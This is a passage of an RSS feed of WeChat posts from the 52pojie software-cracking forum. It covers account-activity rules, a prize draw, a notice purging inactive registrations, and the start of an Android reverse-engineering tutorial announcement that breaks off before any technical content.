text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">坚</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">登</span><span style="display: inline-block; text-indent: initial;">录</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">保</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">跃</span><span style="display: inline-block; text-indent: initial;">才</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">保</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">庭</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">每</span><span style="display: inline-block; text-indent: initial;">次</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">只</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">完</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">就</span><span style="display: inline-block; text-indent: initial;">完</span><span style="display: inline-block; text-indent: initial;">事</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">续</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">坚</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">登</span><span style="display: inline-block; text-indent: initial;">陆</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">导</span><span style="display: inline-block; text-indent: initial;">致</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">最</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">希</span><span style="display: inline-block; text-indent: initial;">望</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">禁</span><span style="display: inline-block; text-indent: initial;">止</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">甲</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">禁</span><span style="display: inline-block; text-indent: initial;">止</span><span style="display: inline-block; text-indent: initial;">贩</span><span style="display: inline-block; text-indent: initial;">卖</span><span style="display: inline-block; text-indent: initial;">倒</span><span style="display: inline-block; text-indent: initial;">卖</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">经</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">即</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">删</span><span style="display: inline-block; text-indent: initial;">除</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">处</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">珍</span><span style="display: inline-block; text-indent: initial;">惜</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">宝</span><span style="display: inline-block; text-indent: initial;">贵</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">小</span><span style="display: inline-block; text-indent: initial;">小</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">给</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">欢</span><span style="display: inline-block; text-indent: initial;">声</span><span style="display: inline-block; text-indent: initial;">笑</span><span style="display: inline-block; text-indent: initial;">语</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">法</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">金</span><span style="display: inline-block; text-indent: initial;">钱</span><span style="display: inline-block; text-indent: initial;">衡</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">祝</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">访</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">情</span><span style="display: inline-block; text-indent: initial;">愉</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li></ul><p><br /></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">抽</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">（</span><span style="display: inline-block; text-indent: initial;">抽</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">）</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">公</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">台</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">“313</span><span style="display: inline-block; text-indent: initial;">福</span><span style="display: inline-block; text-indent: initial;">利</span><span style="display: inline-block; text-indent: initial;">”</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">取</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">法</span><span style="display: inline-block; text-indent: initial;">，</span><strong style="letter-spacing: 0.544px;"><span style="display: inline-block; text-indent: initial;">周四3</span></strong><span style="display: inline-block; text-indent: initial;">月7</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">币，防止错过开放注册，强烈建议设置“星标”</span><span style="display: inline-block; text-indent: initial;">。</span></strong></span></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><br /></strong></span></p><p><em><span style="color: rgb(136, 136, 136); font-size: 14px;"></span></em><em style="letter-spacing: 0.544px;"><span style="color: rgb(136, 136, 136); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">上</span><span style="display: inline-block; text-indent: initial;">次</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">居</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">位</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">位</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">按</span><span style="display: inline-block; text-indent: initial;">照</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">求</span><span style="display: inline-block; text-indent: initial;">提</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">截</span><span style="display: inline-block; text-indent: initial;">图</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">也</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">所</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">则</span><span style="display: inline-block; text-indent: initial;">哦</span><span style="display: inline-block; text-indent: initial;">。</span></span></em></p><p><br /></p><p style="margin-bottom: 0px; color: rgb(53, 53, 53); text-align: start; letter-spacing: 0.544px; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1896511-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Mon, 04 Mar 2024 17:32:35 +0800</pubDate>
</item>
<item>
<title>【清理未活跃会员】清理2023年光棍节开放注册未活跃会员公告</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140115&amp;idx=1&amp;sn=db7f92a4ac85c70895044bbf2310673f&amp;chksm=bd50a0478a2729510f2f0867624e77365291d553c803ad6a5e5258cabdc125f33bd11ed5f866&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140115&amp;idx=1&amp;sn=db7f92a4ac85c70895044bbf2310673f&amp;chksm=bd50a0478a2729510f2f0867624e77365291d553c803ad6a5e5258cabdc125f33bd11ed5f866&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span></span> <span>2024-02-29 17:29</span> <span style="display: inline-block;">北京</span>
</p>

<p>3月13日十六周年开放注册即将到来，届时会提前发布公告通知。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=46dde67a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZLZWpYtrrVmkya5YJ5ZPb0hicTxzXLj6k7G812bV22qibLsr2gbicxzlVBrosR41MfbLZDuyUxnibm0nA%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 15px;"><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ee2bc56f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZLZWpYtrrVmkya5YJ5ZPb0hZrlFUnEKOAxaXRRmQAfT32WPRF4AKdIWYKc0XOMKFICeoWrIQ7tXCA%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: 100%; height: auto;" /></p><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-weight: 700;">吾爱破解论坛2023年光棍节开放注册一天四小时内共注册28290人！</span></p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>为了保持论坛的活性，统计开放注册后就一直<span style="font-weight: 700;">未激活会员共756位</span></p></li><li style="margin-left: 2px;"><p>激活后发帖和回帖总计不超过2贴的会员<span style="font-weight: 700;">20946名</span></p></li><li style="margin-left: 2px;"><p>注册一个月后就再也没有登录过的会员<span style="font-weight: 700;">398名</span></p></li></ul><li style="margin-left: 2px;"><p>以上未活跃用户今日账号<span style="font-weight: 700;">全部清除</span></p></li><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-weight: 700;"><span style="color: #ff0000;">清理前我们已经再三多次提醒过</span></span>，比如：</p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-weight: 700;"><span style="color: #ff0000;">开放注册的时候强制十分钟阅读须知提醒</span></span><br /><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=7f7453fe&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLZWpYtrrVmkya5YJ5ZPb0hCMg8w8fXDUStPceXoXxRg9pqjGxE0mddGcAZ8k8q87tt64sbOJMG5g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: 100%; height: auto;" width="999" /></p><p><br /></p></li><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-weight: 700;"><span style="color: #ff0000;">注册后发送激活邮件中再次提醒</span></span><br /><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=d1904191&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZLZWpYtrrVmkya5YJ5ZPb0hyL83XCzuFSEENEcsVqw7OJJDV9YAGfN3QI66Rs9DHOZAX1f1pQic5fw%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: 100%; height: auto;" width="1080" /></p><p><br /></p></li><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-weight: 700;"><span style="color: #ff0000;">开放注册后几天持续在论坛首页提醒</span></span><br /><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=8ec10b83&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLZWpYtrrVmkya5YJ5ZPb0hj4j7yHrDgWWBQKv5ZXdnX7nq75zeAXm48jCjuCy4jYxX4gCqR08RUw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: 100%; height: auto;" width="1051" /></p><p><br /></p></li></ul><li style="margin-left: 2px;"><p><span style="font-weight: 700;">最后统计有效注册人数为6168名，请多登陆发帖回帖保持活跃</span>。</p></li><li style="margin-left: 2px;"><p>其他还删除了几百个马甲账号和为贩卖账号注册的已激活账号和一些违规账号，在此不再一一告知，只做简单的陈述，欢迎大家发现此类账号在投诉举报区举报。</p></li></ul><h3 style="margin-bottom: 16px; font-size: 1.25em; font-weight: 600; line-height: 1.25; border-bottom: 2px solid rgb(204, 204, 204);">大家珍惜自己的账号，还要防止账号被盗，保护好账号的安全，经常登陆论坛并发帖！</h3><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>论坛众多热心会员积极举报违规行为，来协助论坛管理团队的工作，在斑竹巡查的辛勤管理下，日益恢复正常，但是灌水的，冒充别人作品的，甚至投放木马的还是层出不穷，虽然论坛有很多反病毒工程师和管理团队，但是力量还是远远不够的，这里需要大家都参与到论坛秩序维护中来，维护论坛秩序人人有责，尽自己的一份力量，帮助维护论坛秩序，发现违规的帖子可以来投诉举报区投诉举报:https://www.52pojie.cn/forum-15-1.html</p></li><li style="margin-left: 2px;"><p><span style="font-weight: 700;">站点帮助文档：有问题一般在这里都能找到！</span><br />https://www.52pojie.cn/misc.php?mod=faq</p></li></ul><p><br /><span><span style="color: Red;"><span style="font-weight: 700;">3月13日十六周年开放注册即将到来，届时会提前发布公告通知。</span></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1894998-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Thu, 29 Feb 2024 17:29:04 +0800</pubDate>
</item>
<item>
<title>吾爱破解安卓逆向入门教程《安卓逆向这档事》番外实战篇2-【2024春节】解题领红包活动，启动!</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140106&amp;idx=1&amp;sn=47a4d985cc32e332e1e039fc810896de&amp;chksm=bd50a05e8a272948a2fc4af36269aeb24616aec58c3391d960ad4b6d37709bcdf1b5242891af&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140106&amp;idx=1&amp;sn=47a4d985cc32e332e1e039fc810896de&amp;chksm=bd50a05e8a272948a2fc4af36269aeb24616aec58c3391d960ad4b6d37709bcdf1b5242891af&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-02-28 15:36</span> <span style="display: inline-block;">北京</span>
</p>

<p>由吾爱破解论坛移动安全区版主 正己录制的吾爱破解安卓逆向 0基础 新手小白 视频教程《安卓逆向这档事》正式上线啦，如果你想学习安卓逆向，这是一个不错的机会呦！</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=69140466&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZK4vurNtX1rxTQjtTg4ULaV1Q4tBeqeF0dE9fgOtO8DW4VwLAy2wHRX0NuyBGl8NbPRYlBHy46EFQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p><span style="font-size: 24px;"><strong style="letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>坛账号：正己</span></strong></span></p><p><br /></p><p><span style="background-color: rgb(255, 251, 0);">这是面向 <strong>0基础</strong> <strong>新手入门</strong> 的<strong>视频动画教程</strong>，后面一大段文字只是视频讲解课件，直接拉到<strong>底部点击“</strong><strong>阅读原文”</strong><strong>观看视频</strong>，手把手教学，入门建议从第一课学起，持续更新中。</span></p><p><span>由吾爱破解论坛移动安全区版主 正己录制的吾爱破解安卓逆向</span><span style="color: rgb(255, 0, 0);"><strong><span> 0基础 新手小白 视频教程</span></strong></span><span>《安卓逆向这档事》正式上线啦，如果你想学习安卓逆向，这是一个不错的机会呦！</span></p><p><span>前情提要：<a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140090&amp;idx=1&amp;sn=d8b3011c016ae650d83db7bd9363878c&amp;chksm=bd50bfae8a2736b8260a8115ae2b0b95c929c8b221cabd8733853f6ba5409180b6a1443b30c0&amp;scene=21#wechat_redirect" target="_blank">吾爱破解安卓逆向入门教程《安卓逆向这档事》十七、你的RPCvs佬的RPC</a></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: 0.544px; font-size: 16px;"><br /></span></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" 